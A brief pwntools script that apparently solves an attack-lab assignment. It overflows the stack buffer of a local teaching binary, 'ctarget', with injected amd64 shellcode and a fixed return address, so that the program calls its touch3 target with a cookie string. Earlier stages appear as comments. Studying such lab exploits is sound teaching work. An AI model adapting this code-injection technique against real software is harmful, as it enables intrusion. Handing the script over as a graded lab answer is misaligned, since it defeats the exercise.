#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

cookie = p32(0x59b997fa)
touch1 = p32(0x4017c0)
touch2 = p32(0x4017ec)
touch3 = p32(0x4018fa)

# p = gdb.debug(["./ctarget", "-q"])
p = process(["./ctarget", "-q"])

# exp for touch1
# p.sendline(b"A"*40 + touch1);

# exp for touch2
# shellcode = """
#     mov rdi, 0x59b997fa
#     push 0x4017ec
#     ret
# """
# print(len(asm(shellcode)))
# p.sendline(asm(shellcode) + b"A"*27 + p32(0x5561dc78));

# exp for touch3
shellcode = """
    mov rdi, 0x5561dca8
    push 0x4018fa
    ret
"""
print(len(asm(shellcode)))
p.sendline(asm(shellcode) + b"A"*27 + p64(0x5561dc78) + b"59b997fa");

print(p.readall().decode())



